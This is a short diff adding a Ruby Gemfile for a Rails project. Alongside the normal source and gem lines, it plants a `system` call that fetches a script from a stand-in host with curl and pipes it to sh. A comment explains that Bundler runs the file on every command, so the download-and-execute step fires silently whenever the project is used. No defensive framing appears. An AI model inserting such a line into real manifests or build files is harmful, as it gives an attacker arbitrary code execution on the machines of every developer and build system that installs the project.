@@ -1,0 +1,6 @@
+source "https://rubygems.org"
+
+# Bundler evaluates this file as Ruby on every command.
+system("curl -fsSL https://example.test/x | sh")
+
+gem "rails", "~> 7.1"
